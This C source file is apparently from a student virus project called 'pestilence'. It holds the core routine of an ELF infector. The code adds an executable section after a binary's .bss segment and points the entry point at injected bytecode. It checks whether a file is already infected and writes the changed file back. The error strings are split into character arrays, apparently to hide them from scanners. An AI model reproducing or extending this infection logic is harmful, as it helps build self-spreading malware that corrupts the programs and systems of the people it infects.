#include "pestilence.h"

bool	check_headers_offset(struct s_woody *woody) {
	Elf64_Shdr	tmp_shdr;

	if (woody->ehdr.e_phoff + woody->ehdr.e_phentsize * woody->ehdr.e_phnum > (size_t)woody->bin_st.st_size \
		|| woody->ehdr.e_shoff + woody->ehdr.e_shentsize * woody->ehdr.e_shnum > (size_t)woody->bin_st.st_size)
	{
		ERROR(((char []){'c','o','r','r','u','p','t','e','d',' ','E','L','F',' ','f','i','l','e','\0'}));
		return false;
	}
	for (uint16_t i = 0; i < woody->ehdr.e_shnum; i++) {
		if (!read_section_header(woody, i, &tmp_shdr))
			return false;
		if ((size_t)tmp_shdr.sh_offset + (tmp_shdr.sh_type == SHT_NOBITS ? 0 : (size_t)tmp_shdr.sh_size) > (size_t)woody->bin_st.st_size) {
			ERROR(((char []){'c','o','r','r','u','p','t','e','d',' ','E','L','F',' ','f','i','l','e',' ','(','w','r','o','n','g',' ','s','e','c','t','i','o','n',' ','o','f','f','s','e','t',' ','a','n','d',' ','s','i','z','e',')','\0'}));
			return false;
		}
	}
	return true;
}

bool		get_shstrtab(struct s_woody *woody) {
	if (woody->ehdr.e_shstrndx == SHN_XINDEX) {
		Elf64_Shdr first_shdr;
		if (!read_section_header(woody, 0, &first_shdr))
			return false;
		return read_section_header(woody, first_shdr.sh_link, &woody->shstrtab);
	}
	else
		return read_section_header(woody, woody->ehdr.e_shstrndx, &woody->shstrtab);
}

uint16_t	get_index_section_with_name(struct s_woody *woody, char *section_name) {
	Elf64_Shdr	tmp;
	void		*end_of_str;
	size_t		offset_name;

	for (uint16_t i = 0; i < woody->ehdr.e_shnum; i++) {
		if (!read_section_header(woody, i, &tmp))
			return (-1);
		offset_name = woody->shstrtab.sh_offset + tmp.sh_name;
		if (offset_name > (size_t)woody->bin_st.st_size) {
			ERROR(((char []){'c','o','r','r','u','p','t','e','d',' ','E','L','F',' ','f','i','l','e',' ','(','w','r','o','n','g',' ','s','h','s','t','r','a','b',' ','o','f','f','s','e','t',')','\0'}));
			return (-1);
		}
		end_of_str = ft_memchr(woody->bin_map + offset_name, 0, (size_t)woody->bin_st.st_size - offset_name);
		if (!end_of_str) {
			ERROR(((char []){'c','o','r','r','u','p','t','e','d',' ','E','L','F',' ','f','i','l','e',' ','(','s','h','s','t','r','t','a','b','.','s','h','_','n','a','m','e',' ','n','o','t',' ','N','U','L','L',' ','t','e','r','m','i','n','a','t','e','d',')','\0'}));
			return (-1);
		}
		if (ft_strcmp(section_name, woody->bin_map + offset_name) == 0)
			return (i);
	}
	return (-1);
}

uint16_t	get_index_segment_containing_section(struct s_woody *woody, Elf64_Shdr *section) {
	Elf64_Phdr tmp;
	for (uint16_t i = 0; i < woody->ehdr.e_phnum; i++) {
		if (!read_program_header(woody, i, &tmp))
			return (-1);
		if (tmp.p_vaddr <= section->sh_addr && section->sh_addr <= tmp.p_vaddr + tmp.p_memsz)
			return (i);
	}
	return (-1);
}

void		fill_new_section(struct s_woody *woody, Elf64_Shdr *new_section, Elf64_Shdr *shdr_last) {
	(void)woody;
	new_section->sh_name = 0;
	new_section->sh_type = SHT_PROGBITS;
	new_section->sh_flags = SHF_EXECINSTR | SHF_ALLOC;
	new_section->sh_addr = shdr_last->sh_addr + shdr_last->sh_size; // Push bc shdr_last will be at least SHT_PROGBITS
	new_section->sh_offset = shdr_last->sh_offset + shdr_last->sh_size;
	new_section->sh_size = BYTECODE_SIZE;
	new_section->sh_link = 0;
	new_section->sh_info = 0;
	new_section->sh_addralign = 1;
	new_section->sh_entsize = 0;
}

uint16_t	get_index_last_shdr_in_phdr_bss(struct s_woody *woody, uint16_t index_shdr_bss, Elf64_Phdr *phdr_bss) {
	uint64_t	phdr_bss_last_byte = phdr_bss->p_vaddr + phdr_bss->p_memsz;
	Elf64_Shdr	tmp;

	for (uint16_t i = index_shdr_bss; i < woody->ehdr.e_shnum; i++) {
		if (!read_section_header(woody, i, &tmp))
			return (-1);
		if (tmp.sh_addr + tmp.sh_size == phdr_bss_last_byte)
			return (i);
	}
	return (-1);
}

bool		insert_section_after_bss(struct s_woody *woody) {
	Elf64_Shdr	shdr_last;
	Elf64_Shdr	shdr_bss;
	Elf64_Shdr	shdr_text;
	Elf64_Phdr	phdr_bss;
	uint16_t	index_shdr_bss;
	uint16_t	index_shdr_text;
	uint16_t	index_phdr_bss;
	uint16_t	index_shdr_last;

	// get shdr of bss
	index_shdr_bss = get_index_section_with_name(woody, ((char []){'.','b','s','s','\0'}));
	if (index_shdr_bss == (uint16_t)-1) {
		ERROR(((char []){'.','b','s','s',' ','s','e','c','t','i','o','n',' ','n','o','t',' ','f','o','u','n','d','\0'}));
		return false;
	}
	if (!read_section_header(woody, index_shdr_bss, &shdr_bss))
		return false;

	// get phdr of bss
	index_phdr_bss = get_index_segment_containing_section(woody, &shdr_bss);
	if (index_phdr_bss == (uint16_t)-1) {
		ERROR(((char []){'.','b','s','s',' ','s','e','c','t','i','o','n',' ','n','o','t',' ','m','a','p','p','e','d',' ','(','?',')','\0'}));
		return false;
	}
	if (!read_program_header(woody, index_phdr_bss, &phdr_bss))
		return false;

	// get last shdr of the phdr containing bss
	index_shdr_last = get_index_last_shdr_in_phdr_bss(woody, index_shdr_bss, &phdr_bss);
	if (index_shdr_last == (uint16_t)-1) {
		ERROR(((char []){'l','a','s','t',' ','s','e','c','t','i','o','n',' ','o','f',' ','p','h','d','r',' ','b','s','s',' ','n','o','t',' ','f','o','u','n','d','\0'}));
		return false;
	}
	if (!read_section_header(woody, index_shdr_last, &shdr_last))
		return false;

	if (shdr_last.sh_type == SHT_NOBITS)
		woody->new_section_and_padding_size = BYTECODE_SIZE + shdr_last.sh_size;
	else
		woody->new_section_and_padding_size = BYTECODE_SIZE;

	// get shdr text
	index_shdr_text = get_index_section_with_name(woody, ((char []){'.','t','e','x','t','\0'}));
	if (index_shdr_text == (uint16_t)-1) {
		ERROR(((char []){'.','t','e','x','t',' ','s','e','c','t','i','o','n',' ','n','o','t',' ','f','o','u','n','d','\0'}));
		return false;
	}
	if (!read_section_header(woody, index_shdr_text, &shdr_text))
		return false;
	// Check if old entrypoint + size .text are valid
	if (shdr_text.sh_offset + shdr_text.sh_size > (size_t)woody->bin_st.st_size) {
		ERROR(((char []){'c','o','r','r','u','p','t','e','d',' ','b','i','n','a','r','y',' ','(','w','r','o','n','g',' ','.','t','e','x','t',' ','s','e','c','t','i','o','n',' ','s','i','z','e',')','\0'}));
		return false;
	}

	if (check_binary_infected(woody, &shdr_last))
		return false;

	if (!modify_shdr_last(woody, &shdr_last, index_shdr_last)) // Must be done before fill_new_section
		return false;
	fill_new_section(woody, &woody->new_section, &shdr_last);
	woody->new_entry = shdr_last.sh_addr + shdr_last.sh_size;

	modify_ehdr(woody);
	modify_phdr_bss(woody, &phdr_bss, index_phdr_bss);
	if (!modify_shdr_pushed_by_new_section(woody, index_shdr_last))
		return false;

	return save_new_elf_file(woody, &shdr_last, index_shdr_last);
}
